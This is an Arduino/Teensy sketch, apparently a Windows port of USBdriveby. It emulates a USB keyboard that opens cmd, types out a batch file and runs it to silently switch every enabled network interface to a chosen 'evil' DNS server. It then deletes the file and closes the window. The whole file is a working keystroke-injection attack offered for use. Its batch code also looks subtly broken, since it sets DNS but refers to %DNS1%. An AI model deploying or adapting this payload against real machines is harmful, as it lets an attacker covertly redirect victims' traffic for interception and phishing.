
// USBdriveby Windows version by FFY00 (Filipe Laíns)
// Based on Samy Kamkar work

// Simulates a HID keyboard and runa bash file to change the dns server
// Tested on Windows 7

// Evil DNS Server
#define EVIL_SERVER "8.8.8.8"
const unsigned int ledPin = 13;
const unsigned int delayTime = 1500;

void setup()
{
  delay(1000);

  // Setup LED
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, HIGH);
  waitForDrivers();

  // Do the shit...
  pwn();

}

// Open an application on Windows via Run
void openapp(String app)
{
  // Windows Key + R to open Run
  key(KEY_R , MODIFIERKEY_RIGHT_GUI);
  delay(delayTime);

  // Type the App you want to open
  Keyboard.print(app);
  key(KEY_ENTER, 0);
  Keyboard.send_now();
  delay(delayTime);
}

void key(int KEY, int MODIFIER)
 {
  Keyboard.set_modifier(MODIFIER);
  Keyboard.set_key1(KEY);
  Keyboard.send_now();
  delay(20);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(20);
 }

void waitForDrivers()
{
    while (!(keyboard_leds & 2))
    {
        key(KEY_CAPS_LOCK, 0);
    }
    if (keyboard_leds & 2)
    {
        key(KEY_CAPS_LOCK, 0);
    }
}


void pwn()
{
  openapp("cmd");
  Keyboard.println("cd AppData/Local/Temp");
  Keyboard.println("echo.>pwn.bat");
  Keyboard.println("notepad pwn.bat");
  
  delay(delayTime);
  Keyboard.println("@ECHO OFF");
  Keyboard.print("set DNS=");
  Keyboard.println(EVIL_SERVER);
  Keyboard.println("for /f \"tokens=1,2,3*\" %%i in ('netsh int show interface') do (");
  Keyboard.println("    if %%i equ Enabled (");
  Keyboard.println("        netsh int ipv4 set dns name=\"%%l\" static %DNS1% primary validate=no");
  Keyboard.println("    )");
  Keyboard.println(")");
  Keyboard.println("ipconfig /flushdns"); // Flush DNS is optional
  key(KEY_F4, MODIFIERKEY_ALT);
  delay(delayTime/5);
  key(KEY_ENTER, 0);
  delay(delayTime);

  Keyboard.println("pwn.bat");
  delay(delayTime);
  Keyboard.println("del pwn.bat");

  key(KEY_SPACE, MODIFIERKEY_ALT);
  delay(delayTime/10);
  key(KEY_C, 0);
}

void loop()
{
  // Blink -> IT'S DONE
  digitalWrite(ledPin, HIGH);
  delay(80);
  digitalWrite(ledPin, LOW);
  delay(80);
}
